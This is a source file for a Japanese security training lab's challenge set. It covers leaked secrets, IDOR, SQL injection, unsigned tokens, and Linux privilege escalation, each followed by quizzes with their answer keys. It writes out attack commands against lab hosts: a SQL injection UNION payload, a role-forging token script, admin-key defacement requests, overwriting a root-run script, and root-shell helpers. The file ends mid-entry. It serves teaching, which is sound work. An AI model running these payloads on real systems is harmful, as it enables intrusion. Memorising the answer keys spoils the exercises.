import { useCallback, useEffect, useMemo, useState } from 'react';

interface Challenge {
  id: string;
  title: string;
  goal: string;
  commands: string[];
  hint: string;
  result: string;
  answerId?: string;
  stage?: 'attack' | 'understand' | 'defend' | 'summary';
  choices?: { id: string; label: string }[];
  multiple?: boolean;
}

interface ChallengeGroup {
  id: 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 'tools';
  title: string;
  subtitle: string;
  category?: 'Web' | 'Linux / OS';
  challenges: Challenge[];
}

function shuffleKey(value: string) {
  let hash = 2166136261;
  for (let index = 0; index < value.length; index += 1) {
    hash ^= value.charCodeAt(index);
    hash = Math.imul(hash, 16777619);
  }
  return hash >>> 0;
}

function shuffledChoices(choices: Challenge['choices'], seed: string) {
  if (!choices) return [];
  return choices
    .map((choice, index) => ({ choice, rank: shuffleKey(`${seed}:${choice.id}:${index}`) }))
    .sort((left, right) => left.rank - right.rank)
    .map(({ choice }) => choice);
}

interface Props {
  onInsertCommand: (command: string) => void;
  resetSignal: number;
  targetId: 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9;
  onTargetChange: (targetId: 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9) => void;
  scope: 'targets' | 'tools' | 'vulnerabilities';
}

const challengeGroups: ChallengeGroup[] = [
  {
    id: 1,
    title: '問題1',
    subtitle: '研修サイトの管理APIとFlag',
    category: 'Web',
    challenges: [
      {
        id: '01', title: '公開バックアップを見つける',
        goal: '`robots.txt` を調べ、公開されてしまったバックアップ設定から管理APIと管理キーを特定してください。',
        commands: ["curl -i -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target:3000/robots.txt", "curl -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target:3000/backup/config.json"],
        hint: '`Disallow` は検索エンジンへのお願いで、アクセス制御ではありません。表示されたJSONの `adminApi` と `adminKey` を確認します。',
        result: '設定JSONから管理APIのパスと管理キーを確認できれば次へ進めます。',
      },
      {
        id: '02', title: '管理APIで表示を変更する', goal: '漏えいした管理キーを使い、管理APIでTarget 1の見出しとテーマを変更してください。',
        commands: ["curl -X POST http://target:3000/api/admin/banner -H 'Content-Type: application/json' -H 'X-Admin-Key: training-admin-2026' -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -d '{\"headline\":\"研修サイトは改ざんされました\",\"theme\":\"compromised\"}'"],
        hint: 'JSONを送るので `Content-Type` を指定し、認証値は `X-Admin-Key` ヘッダーへ入れます。',
        result: '左下のサイトが赤い警告テーマへ変われば、改ざん条件の一部を満たしています。',
      },
      {
        id: '03', title: '警告メッセージを追加する', goal: '同じ管理キーで通知APIを呼び、トップページへ任意の警告メッセージを追加してください。',
        commands: ["curl -X POST http://target:3000/api/admin/notice -H 'Content-Type: application/json' -H 'X-Admin-Key: training-admin-2026' -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -d '{\"notice\":\"直ちにパスワードを変更してください\"}'"],
        hint: '管理APIで更新できる項目が多いほど、キー漏えい時の影響も広がります。',
        result: 'トップページに赤い警告メッセージが追加されれば成功です。',
      },
      {
        id: '04', title: '攻略状態を確認する', goal: 'APIから現在の状態を取得し、Target 1が改ざん済みになっていることを確認してください。',
        commands: ["curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target:3000/api/status"],
        hint: '見た目だけでなく、APIの `modified` が `true` になっていることも証拠になります。',
        result: '`modified` が `true` で、更新した `site` 情報が返ればFlag取得条件を満たしています。',
      },
      {
        id: '05', title: 'ATTACK: Flagを取得して回答する', answerId: 'target1', stage: 'attack',
        goal: '改ざん条件を満たした後、Target 1からセッション専用Flagを取得し、下の回答欄へ入力してください。',
        commands: ["curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target:3000/api/flag"],
        hint: 'RESETすると攻略状態とFlagは初期化されます。他セッションのFlagはこの回答では使えません。',
        result: 'Target 1が返した `TBX{target1_...}` を回答欄へ入力し、正解時だけCLEARになります。',
      },
      {
        id: '06', title: 'UNDERSTAND: なぜ成功したか', answerId: 'target1-understand', stage: 'understand',
        goal: 'この攻撃が成功した主な原因を選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: '秘密情報をWeb公開領域へ置いていたため。' },
          { id: 'B', label: 'SQL文へユーザー入力を直接連結していたため。' },
          { id: 'C', label: 'ログイン後にセッションIDを再生成しなかったため。' },
        ],
        hint: '`robots.txt` は隠し場所のヒントにはなっても、アクセス制御にはなりません。',
        result: '「隠す」のではなく、秘密情報を公開領域へ置かないことが重要です。',
      },
      {
        id: '07', title: 'DEFEND: どう防ぐか', answerId: 'target1-defend', stage: 'defend', multiple: true,
        goal: '秘密情報管理として適切な対策をすべて選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: '設定ファイルやSecretをWeb公開領域へ置かない。' },
          { id: 'B', label: 'Secret Managerや環境変数など、公開されない保管場所を使う。' },
          { id: 'C', label: '管理APIはSecretだけでなく認証・認可・監査で守る。' },
          { id: 'D', label: 'robots.txtに書いて検索エンジンから隠す。' },
        ],
        hint: '秘密情報は「見つかりにくいURL」では守れません。',
        result: 'A/B/Cが正解です。robots.txtは公開ファイルなので防御にはなりません。',
      },
      {
        id: '08', title: 'MISSION COMPLETE', stage: 'summary',
        goal: 'テーマ: 秘密情報管理。学ぶこと: 「隠す」のではなく、秘密情報を公開領域へ置かない。',
        commands: [],
        hint: 'Target 1では、公開されたバックアップ設定が管理APIの侵入口になりました。',
        result: 'ATTACK / UNDERSTAND / DEFEND を完了したら、このテーマは終了です。',
      },
    ],
  },
  {
    id: 2,
    title: '問題2',
    subtitle: 'ECサイトのIDOR / Broken Access Control',
    category: 'Web',
    challenges: [
      {
        id: '01', title: 'ブラウザUIからログインする',
        goal: '左下のTarget 2ブラウザ画面を開き、研修用アカウントで通常ログインしてください。username: `student` / password: `market123`',
        commands: [],
        hint: 'Target 2は秘密情報の公開漏えいではありません。最初のログインは左下ブラウザ画面のフォームから行います。',
        result: 'ログイン後に自分の商品・注文・プロフィールへ進めるダッシュボードが表示されれば成功です。',
      },
      {
        id: '02', title: '自分のリソースIDを確認する',
        goal: 'ログイン後の画面やAPIレスポンスから、自分の商品IDや注文IDがURLで使われていることを確認してください。',
        commands: ["curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target2:3000/api/status", "curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target2:3000/api/store/products/2001"],
        hint: '通常の認証は動作していますが、サーバーが対象リソースの所有者まで確認しているかが観察ポイントです。',
        result: '自分の商品ID `2001` の詳細を確認できれば次へ進めます。',
      },
      {
        id: '03', title: '別店舗の商品を読み取る',
        goal: 'IDを変更し、本来は権限のない別店舗の商品リソースを読み取れることを確認してください。',
        commands: ["curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target2:3000/api/store/products/2002"],
        hint: 'ブラウザでも `/store/products/2002` へ移動できます。認証済みであっても、そのIDを操作する権限があるとは限りません。',
        result: '別店舗の商品 `2002` が拒否されず表示されれば、IDORの読み取り不備を確認できています。',
      },
      {
        id: '04', title: '別店舗の商品を変更する',
        goal: '別店舗の商品IDに対して更新操作を行い、サーバー側の認可チェック不足を体験してください。',
        commands: ["curl -X POST http://target2:3000/api/store/products/2002 -H 'Content-Type: application/json' -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -d '{\"price\":1,\"stock\":999,\"name\":\"Broken Access Control Demo\"}'"],
        hint: '本来は「ログイン済みか」だけでなく「この商品を編集できるユーザーか」をサーバー側で確認する必要があります。',
        result: '別店舗の商品が更新されれば、Flag取得条件を満たしています。',
      },
      {
        id: '05', title: 'ATTACK: Flagを取得して回答する', answerId: 'target2', stage: 'attack',
        goal: 'IDORの変更操作を成功させた後、Target 2からセッション専用Flagを取得し、下の回答欄へ入力してください。',
        commands: ["curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target2:3000/api/flag"],
        hint: 'FlagはTarget 2側でセッションごとに生成されます。フロントエンドのソースには固定Flagを置いていません。',
        result: 'Target 2が返した `TBX{target2_...}` を回答欄へ入力し、正解時だけCLEARになります。',
      },
      {
        id: '06', title: 'UNDERSTAND: なぜ成功したか', answerId: 'target2-understand', stage: 'understand',
        goal: 'このIDORが成立した理由を選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'ログイン済みかだけを見て、対象商品の所有者を確認していなかったため。' },
          { id: 'B', label: 'パスワードが短すぎたため。' },
          { id: 'C', label: 'robots.txtに商品IDが載っていたため。' },
        ],
        hint: '認証済みであることと、そのデータを操作できることは別です。',
        result: '認可はリソースごとにサーバー側で確認する必要があります。',
      },
      {
        id: '07', title: 'DEFEND: どう防ぐか', answerId: 'target2-defend', stage: 'defend', multiple: true,
        goal: '認可の対策として適切なものをすべて選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: '更新対象リソースのownerとログインユーザーをサーバー側で照合する。' },
          { id: 'B', label: 'URLやIDを書き換えられても権限確認を必ず実行する。' },
          { id: 'C', label: '許可されないアクセスは403で拒否し、監査ログへ残す。' },
          { id: 'D', label: '画面上のリンクを非表示にするだけで十分。' },
        ],
        hint: 'クライアント側の非表示は補助であり、防御の中心ではありません。',
        result: 'A/B/Cが正解です。認可はサーバー側で強制します。',
      },
      {
        id: '08', title: 'MISSION COMPLETE', stage: 'summary',
        goal: 'テーマ: 認可。学ぶこと: 認証済みでも、そのデータを操作する権限があるとは限らない。',
        commands: [],
        hint: 'Target 2では、他店舗の商品IDを指定できることが問題でした。',
        result: 'ATTACK / UNDERSTAND / DEFEND を完了したら、このテーマは終了です。',
      },
    ],
  },
  {
    id: 3,
    title: '問題3',
    subtitle: '入力値処理: SQL Injection',
    category: 'Web',
    challenges: [
      {
        id: '01', title: 'ATTACK: 検索入力を改変する', answerId: 'target3', stage: 'attack',
        goal: '通常の商品検索を確認した後、SQL Injection相当の入力で研修用データからFlagを取得してください。',
        commands: ["curl -G -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target3:3000/api/search --data-urlencode 'q=apple'", "curl -G -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target3:3000/api/search --data-urlencode \"q=' UNION SELECT id,label,value FROM training_secrets--\"", "curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target3:3000/api/flag"],
        hint: 'まず通常検索のJSONと、レスポンスに含まれる研修用SQL文字列を観察します。2本目では `training_secrets` が結果へ混入します。',
        result: '検索結果またはFlag APIから `TBX{target3_...}` を取得し、回答欄へ入力します。',
      },
      {
        id: '02', title: 'UNDERSTAND: なぜ成功したか', answerId: 'target3-understand', stage: 'understand',
        goal: 'SQL Injectionが成功した主な原因を選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'ユーザー入力をSQL文字列へ直接連結していたため。' },
          { id: 'B', label: 'Secretを公開ディレクトリへ置いていたため。' },
          { id: 'C', label: 'ログアウト後もセッションが残っていたため。' },
        ],
        hint: '検索語はデータであるべきですが、SQL構文として解釈されていました。',
        result: '外部入力は信用せず、SQL構文とは分離して扱います。',
      },
      {
        id: '03', title: 'DEFEND: どう防ぐか', answerId: 'target3-defend', stage: 'defend', multiple: true,
        goal: '入力値処理の対策として適切なものをすべて選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'Parameterized Queryを使用する。' },
          { id: 'B', label: '入力値の型・形式・長さを検証する。' },
          { id: 'C', label: 'DB権限を最小化する。' },
          { id: 'D', label: 'SQLエラーをそのまま利用者へ表示する。' },
        ],
        hint: 'SQLエラーの詳細表示は攻撃者にヒントを与えます。',
        result: 'A/B/Cが正解です。入力はデータとして扱い、DB側権限も絞ります。',
      },
      {
        id: '04', title: 'MISSION COMPLETE', stage: 'summary',
        goal: 'テーマ: 入力値処理。学ぶこと: ユーザー入力は信用せず、安全な方法で処理する。',
        commands: [],
        hint: 'Target 3では、検索語がSQLとして混ざることでFlagが露出しました。',
        result: 'ATTACK / UNDERSTAND / DEFEND を完了したら、このテーマは終了です。',
      },
    ],
  },
  {
    id: 4,
    title: '問題4',
    subtitle: 'セッション / 認証: JWT検証不足',
    category: 'Web',
    challenges: [
      {
        id: '01', title: 'ATTACK: トークンを改変する', answerId: 'target4', stage: 'attack',
        goal: '通常ログインで研修トークンを取得し、Base64URLのJSON内の `role` を `admin` に変えて管理者APIからFlagを取得してください。',
        commands: ["curl -s -X POST -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -H 'Content-Type: application/json' -d '{\"username\":\"student\",\"password\":\"portal123\"}' http://target4:3000/api/login", "python3 -c \"import base64,json; t=input('token: ').strip(); p=json.loads(base64.urlsafe_b64decode(t+'='*(-len(t)%4))); p['role']='admin'; print(base64.urlsafe_b64encode(json.dumps(p,separators=(',',':')).encode()).decode().rstrip('='))\"", "curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -H 'Authorization: Bearer 変更後のトークン' http://target4:3000/api/admin"],
        hint: 'Target 4のトークンは署名付きJWTではなく、Base64URL化されたJSONだけです。nonceはセッションごとに変わるため、必ず自分のログインで取得したトークンを使います。',
        result: '管理者APIのレスポンスに出た `TBX{target4_...}` を回答欄へ入力します。',
      },
      {
        id: '02', title: 'UNDERSTAND: なぜ突破できたか', answerId: 'target4-understand', stage: 'understand',
        goal: '認証突破が成立した主な理由を選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'JWT相当のトークンに署名がなく、サーバーが改変を検証していなかったため。' },
          { id: 'B', label: '商品IDの所有者を確認していなかったため。' },
          { id: 'C', label: 'robots.txtに管理キーが書かれていたため。' },
        ],
        hint: 'Base64は暗号化ではありません。利用者が中身を読んで作り替えられます。',
        result: '認証トークンは署名・有効期限・失効管理で改変を検出します。',
      },
      {
        id: '03', title: 'DEFEND: どう防ぐか', answerId: 'target4-defend', stage: 'defend', multiple: true,
        goal: 'セッション / 認証の対策として適切なものをすべて選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'JWT署名を必ず検証する。' },
          { id: 'B', label: 'ログイン成功時にセッションIDやnonceを再生成する。' },
          { id: 'C', label: '有効期限とログアウト時の失効を実装する。' },
          { id: 'D', label: '認証試行にRate Limitを設ける。' },
          { id: 'E', label: 'Base64化すれば改変できないので十分。' },
        ],
        hint: 'Base64は見た目を変えるだけで、完全性は守りません。',
        result: 'A/B/C/Dが正解です。署名検証とライフサイクル管理が認証の土台です。',
      },
      {
        id: '04', title: 'MISSION COMPLETE', stage: 'summary',
        goal: 'テーマ: セッション / 認証。学ぶこと: ログインできることだけでなく、その後のセッション管理も重要。',
        commands: [],
        hint: 'Target 4では、roleを改変したトークンをサーバーが信じたことが問題でした。',
        result: 'ATTACK / UNDERSTAND / DEFEND を完了したら、このテーマは終了です。',
      },
    ],
  },
  {
    id: 5,
    title: '問題5',
    subtitle: 'Defense in Depth: すべて対策済み',
    category: 'Web',
    challenges: [
      {
        id: '01', title: 'ATTACK TEST: 防御を確認する', answerId: 'target5', stage: 'attack',
        goal: 'Target 1〜4で使った代表的な攻撃を試し、すべて防御されることを確認してから防御確認Flagを取得してください。',
        commands: ["curl -i -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target5:3000/backup/config.json", "curl -s -X POST -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -H 'Content-Type: application/json' -d '{\"username\":\"student\",\"password\":\"secure123\"}' http://target5:3000/api/login", "curl -i -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target5:3000/api/products/5002", "curl -G -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target5:3000/api/search --data-urlencode \"q=' UNION SELECT id,label,value FROM training_secrets--\"", "curl -i -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -H 'Authorization: Bearer 改変したトークン' http://target5:3000/api/admin", "curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target5:3000/api/defense/status", "curl -s -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target5:3000/api/flag"],
        hint: '商品IDの確認はログイン後に行います。トークン改変テストは、取得したJWTのpayloadを変えたり、任意の不正文字列を送れば防御チェックになります。',
        result: '4つの防御チェックがtrueになった後、`TBX{secure_target_verified_...}` を回答欄へ入力します。',
      },
      {
        id: '02', title: 'UNDERSTAND: 何を確認したか', answerId: 'target5-understand', stage: 'understand',
        goal: 'Target 5の目的として最も正しい説明を選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: '攻撃成功ではなく、秘密情報・認可・入力・認証の防御が機能することを確認する。' },
          { id: 'B', label: '管理キーを探してサイトを改ざんする。' },
          { id: 'C', label: '外部サイトへSSRFを行って内部情報を探す。' },
        ],
        hint: 'Target 5は攻撃成功ではなく防御確認型です。',
        result: '同じ操作が失敗することも、重要なセキュリティ検証です。',
      },
      {
        id: '03', title: 'DEFEND: Defense in Depth', answerId: 'target5-defend', stage: 'defend', multiple: true,
        goal: 'Defense in DepthとしてTarget 5で確認した対策をすべて選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'SecretをWeb公開領域へ置かない。' },
          { id: 'B', label: 'リソースごとにサーバー側で権限確認する。' },
          { id: 'C', label: 'Parameterized Queryと入力値検証でSQL Injectionを防ぐ。' },
          { id: 'D', label: '署名付きトークン、有効期限、ログイン時の再生成でセッションを守る。' },
          { id: 'E', label: '1つの対策だけ入れておけば他は不要。' },
        ],
        hint: '複数の層があると、1つのミスが即重大事故になりにくくなります。',
        result: 'A/B/C/Dが正解です。1つの対策だけではなく、複数の防御を組み合わせます。',
      },
      {
        id: '04', title: 'MISSION COMPLETE', stage: 'summary',
        goal: 'テーマ: Defense in Depth。学ぶこと: 1つの対策だけではなく、複数の防御を組み合わせる。',
        commands: [],
        hint: 'Target 5では、攻撃を試して失敗を確認することがゴールでした。',
        result: 'ATTACK TEST / UNDERSTAND / DEFEND を完了したら、Target学習は終了です。',
      },
    ],
  },
  {
    id: 6,
    title: 'Target 6 Copy Fail',
    subtitle: 'Linux Kernel脆弱性: Copy Fail LPE',
    category: 'Linux / OS',
    challenges: [
      {
        id: '01', title: 'ATTACK: Copy Failを安全に再現する', answerId: 'target6', stage: 'attack',
        goal: 'Linux LabでKernel LPEの流れを観察し、実Kernel exploitを使わずに疑似root化してFlagを取得してください。',
        commands: ['uname -a', 'cat /home/student/copy-fail-notes.txt', 'cat /opt/copy-fail/README', '/opt/copy-fail/copy_fail_demo --explain', '/opt/copy-fail/copy_fail_demo --simulate', 'whoami', 'cat /root/flag.txt'],
        hint: 'Linux LabはSession IDごとの安全な疑似環境です。`--simulate` はCloud RunやKaliのKernelへ触れず、Copy Failによって権限チェックが壊れた結果だけを再現します。',
        result: '`root@linux-lab:~#` 相当の状態になった後、`/root/flag.txt` の `FLAG{...}` を回答します。',
      },
      {
        id: '02', title: 'UNDERSTAND: 問題の種類', answerId: 'target6-understand', stage: 'understand',
        goal: 'Copy Failがどの層の問題かを選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'Linux Kernelの脆弱性により、一般ユーザーからrootへ権限昇格できる問題。' },
          { id: 'B', label: 'Webフォームの入力値をSQLへ連結した問題。' },
          { id: 'C', label: 'sudoersで特定コマンドを許可しすぎた問題。' },
        ],
        hint: 'Copy Failは権限設定ミスではなく、Kernel内部の処理に起因するLPEとして扱います。',
        result: 'Kernel脆弱性は、アプリ設定が正しくてもOSの権限境界を壊す可能性があります。',
      },
      {
        id: '03', title: 'DEFEND: 実環境での対策', answerId: 'target6-defend', stage: 'defend', multiple: true,
        goal: 'Kernel LPEへの対策として適切なものをすべて選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'KernelとOSパッケージを迅速に更新する。' },
          { id: 'B', label: '不要な権限・capability・危険なsyscallを減らす。' },
          { id: 'C', label: 'コンテナやVMの隔離を前提に、多層防御と監視を行う。' },
          { id: 'D', label: '一般ユーザーならKernel exploitの影響はないと考える。' },
        ],
        hint: 'LPEは「一般ユーザーで侵入された後」の被害拡大に直結します。',
        result: 'A/B/Cが正解です。Kernel更新、権限最小化、隔離と監視を組み合わせます。',
      },
      {
        id: '04', title: 'MISSION COMPLETE', stage: 'summary',
        goal: 'Copy FailはKernelの脆弱性です。一般ユーザーからrootになる危険性を、安全なLinux Lab内だけで確認しました。',
        commands: [],
        hint: '実環境では実Kernel exploit、AF_ALG攻撃、Cloud Run Kernel攻撃、Container Escapeを行ってはいけません。',
        result: '何が問題か: Kernelの欠陥。なぜrootになるか: 権限境界が壊れるため。危険性: 侵入後に全権限を取られる。対策: 更新・最小権限・隔離・監視。',
      },
    ],
  },
  {
    id: 7,
    title: 'Target 7 File Permission',
    subtitle: 'Linux File Permission: owner / group / rwx',
    category: 'Linux / OS',
    challenges: [
      {
        id: '01', title: 'ATTACK: 不適切な権限を悪用する', answerId: 'target7', stage: 'attack',
        goal: 'owner / group / rwxを確認し、rootが実行するスクリプトが誰でも書き換え可能な危険性を体験してください。',
        commands: ['cat /home/student/permission-notes.txt', 'ls -l /opt/perm-lab/maintenance.sh', 'cat /opt/perm-lab/maintenance.sh', "printf 'id\\ncat /root/flag.txt\\n' > /opt/perm-lab/maintenance.sh", '/opt/perm-lab/run-maintenance', 'cat /root/flag.txt'],
        hint: '`-rwxrwxrwx` はowner/group/otherの全員が書き込み可能な状態です。rootが後で実行するファイルを書き換えられると、権限昇格につながります。',
        result: 'Linux Lab内で疑似rootになった後、`/root/flag.txt` の `FLAG{...}` を回答します。',
      },
      {
        id: '02', title: 'UNDERSTAND: 問題の種類', answerId: 'target7-understand', stage: 'understand',
        goal: 'File Permission問題の原因を選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'rootが扱うファイルに過剰な書き込み権限があり、一般ユーザーが内容を変更できたため。' },
          { id: 'B', label: 'Kernelのcopy処理そのものに欠陥があったため。' },
          { id: 'C', label: 'SUIDビットが付いたroot所有バイナリがあったため。' },
        ],
        hint: 'ここで注目するのはrwxとowner/group/otherです。',
        result: 'File Permissionは権限設定の問題です。誰が読めるか、書けるか、実行できるかを正しく制御します。',
      },
      {
        id: '03', title: 'DEFEND: 権限設定の対策', answerId: 'target7-defend', stage: 'defend', multiple: true,
        goal: '不適切なファイル権限への対策として適切なものをすべて選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'rootが実行するファイルを一般ユーザー書き込み不可にする。' },
          { id: 'B', label: 'owner / groupを用途に合わせて最小化する。' },
          { id: 'C', label: 'chmod 777を避け、必要なrwxだけを付与する。' },
          { id: 'D', label: '実行前にファイル内容を確認しない運用でよい。' },
        ],
        hint: '便利だから全員書き込み可にする、という設定は危険です。',
        result: 'A/B/Cが正解です。権限は必要最小限にします。',
      },
      {
        id: '04', title: 'MISSION COMPLETE', stage: 'summary',
        goal: 'File Permissionは権限設定の問題です。owner / group / rwxの誤りがroot権限の処理へつながる危険性を確認しました。',
        commands: [],
        hint: 'Kernelの欠陥ではなく、ファイルの所有者とモードの設計ミスです。',
        result: '何が問題か: 過剰な書き込み権限。なぜrootになるか: root実行ファイルを一般ユーザーが改変できるため。対策: owner/group/chmodを最小化。',
      },
    ],
  },
  {
    id: 8,
    title: 'Target 8 SUID設定ミス',
    subtitle: 'SUID設定ミス: root所有プログラム',
    category: 'Linux / OS',
    challenges: [
      {
        id: '01', title: 'ATTACK: SUID rootを調査する', answerId: 'target8', stage: 'attack',
        goal: 'SUIDビットが付いたroot所有プログラムを見つけ、不適切な機能から疑似root化してFlagを取得してください。',
        commands: ['cat /home/student/suid-notes.txt', 'find / -perm -4000 -type f 2>/dev/null', 'ls -l /usr/local/bin/backup-viewer', '/usr/local/bin/backup-viewer --root-shell', 'id', 'cat /root/flag.txt'],
        hint: '`-rws` の `s` はSUIDを表します。root所有SUIDプログラムは、実行者がstudentでもroot権限で動く部分を持ちます。',
        result: 'SUID helperの安全な疑似root化後、`/root/flag.txt` の `FLAG{...}` を回答します。',
      },
      {
        id: '02', title: 'UNDERSTAND: 問題の種類', answerId: 'target8-understand', stage: 'understand',
        goal: 'SUID設定ミスでroot化できる理由を選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'root所有のSUIDプログラムが、利用者にroot権限の危険な機能を許していたため。' },
          { id: 'B', label: '一般ユーザーがrootのパスワードを知っていたため。' },
          { id: 'C', label: 'robots.txtが公開されていたため。' },
        ],
        hint: 'SUIDは「実行時の権限」が通常のコマンドと異なります。',
        result: 'SUIDは特殊権限の設定問題です。root所有SUIDは特に慎重に扱います。',
      },
      {
        id: '03', title: 'DEFEND: SUIDの対策', answerId: 'target8-defend', stage: 'defend', multiple: true,
        goal: 'SUID設定ミスへの対策として適切なものをすべて選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: '不要なSUIDビットを削除する。' },
          { id: 'B', label: 'SUIDプログラム内でシェル起動や任意ファイル読み取りを許さない。' },
          { id: 'C', label: '定期的にSUIDファイルを棚卸しする。' },
          { id: 'D', label: 'root所有ならSUIDを付けても常に安全。' },
        ],
        hint: 'SUIDは必要なプログラムだけに限定します。',
        result: 'A/B/Cが正解です。特殊権限は棚卸しと最小化が重要です。',
      },
      {
        id: '04', title: 'MISSION COMPLETE', stage: 'summary',
        goal: 'SUIDは特殊権限の設定問題です。root権限で実行されるプログラムの危険性を確認しました。',
        commands: [],
        hint: 'File Permissionのrwxミスとは異なり、SUIDでは実行時の有効権限が問題になります。',
        result: '何が問題か: SUID設定ミス。なぜrootになるか: root所有プログラムがroot権限で危険操作を許すため。対策: SUID削除・安全実装・棚卸し。',
      },
    ],
  },
  {
    id: 9,
    title: 'Target 9 sudo設定ミス',
    subtitle: 'sudo設定ミス: sudoersと過剰な権限委譲',
    category: 'Linux / OS',
    challenges: [
      {
        id: '01', title: 'ATTACK: sudo権限を調査する', answerId: 'target9', stage: 'attack',
        goal: '`sudo -l` で許可された操作を確認し、過剰なsudoers設定から疑似root化してFlagを取得してください。',
        commands: ['cat /home/student/sudo-notes.txt', 'sudo -l', 'sudo /usr/local/bin/log-viewer --root-shell', 'whoami', 'cat /root/flag.txt'],
        hint: '`sudo -l` は現在のユーザーがsudoで実行できるコマンドを表示します。NOPASSWDで危険な機能を許すと権限昇格になります。',
        result: 'sudoers設定ミスの疑似root化後、`/root/flag.txt` の `FLAG{...}` を回答します。',
      },
      {
        id: '02', title: 'UNDERSTAND: 問題の種類', answerId: 'target9-understand', stage: 'understand',
        goal: 'sudo設定ミスでroot化できる理由を選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: '管理者がsudoersでroot権限の危険なコマンドを過剰に委譲していたため。' },
          { id: 'B', label: 'Kernelの脆弱性で権限境界が壊れたため。' },
          { id: 'C', label: 'WebのSQL InjectionでDBを読めたため。' },
        ],
        hint: 'sudoは管理者による権限委譲の仕組みです。',
        result: 'sudo設定ミスは管理者の権限委譲設定の問題です。',
      },
      {
        id: '03', title: 'DEFEND: sudoersの対策', answerId: 'target9-defend', stage: 'defend', multiple: true,
        goal: 'sudoers設定ミスへの対策として適切なものをすべて選んでください。',
        commands: [],
        choices: [
          { id: 'A', label: 'sudoで許可するコマンドを必要最小限にする。' },
          { id: 'B', label: 'シェル起動や任意ファイル読み取りにつながるコマンドを避ける。' },
          { id: 'C', label: 'sudoers変更をレビューし、監査ログを確認する。' },
          { id: 'D', label: 'NOPASSWDなら利用者が信頼できるので制限不要。' },
        ],
        hint: 'sudoersの1行はroot権限への入口になります。',
        result: 'A/B/Cが正解です。委譲範囲の最小化とレビューが重要です。',
      },
      {
        id: '04', title: 'MISSION COMPLETE', stage: 'summary',
        goal: 'sudoは管理者による権限委譲の仕組みです。過剰なsudoers設定がroot取得につながる危険性を確認しました。',
        commands: [],
        hint: 'SUIDの特殊権限とは異なり、sudoではsudoersの許可ルールが問題になります。',
        result: '何が問題か: sudoersの過剰委譲。なぜrootになるか: 許可コマンドがrootシェル相当を許すため。対策: 最小権限・危険機能排除・レビュー・監査。',
      },
    ],
  },
  {
    id: 'tools',
    title: '問題4',
    subtitle: 'セキュリティツール実践ラボ',
    challenges: [
      {
        id: '01', title: 'Burp Suite Community', answerId: 'burp',
        goal: 'Kali DesktopでBurp Suiteを起動し、FirefoxのHTTP Proxyを `127.0.0.1:8080` に設定します。割引申請を捕捉してRepeaterへ送り、`discount`を書き換えてFlagを取得してください。',
        commands: ['firefox http://labtarget:3100/burp/'],
        hint: 'Applications → Web Application Analysis → burpsuite から起動し、Temporary project → Use Burp defaults を選びます。Proxy → Interceptで「Intercept is on」を確認し、Firefoxの設定 → Network SettingsでManual proxyを選択してHTTP Proxyを127.0.0.1、Portを8080にします。Firefoxで割引申請を送るとBurpにリクエストが止まるので、右クリックしてSend to Repeaterを選びます。Repeaterで本文のhiddenパラメータ `discount` を90へ変更してSendを押し、右側のレスポンスに出る `TBX{...}` を確認します。',
        result: 'レスポンスに表示された `TBX{...}` を回答欄へ入力します。',
      },
      {
        id: '02', title: 'Wireshark / tshark', answerId: 'wireshark',
        goal: '配布PCAPからHTTPリクエストを調べ、`X-Training-Flag` ヘッダーを発見してください。Cloud版でも利用できるオフライン解析問題です。',
        commands: ["tshark -r ~/TerminalBox-Labs/capture.pcapng -Y http -V | grep -i -A2 'training-flag'", 'wireshark ~/TerminalBox-Labs/capture.pcapng'],
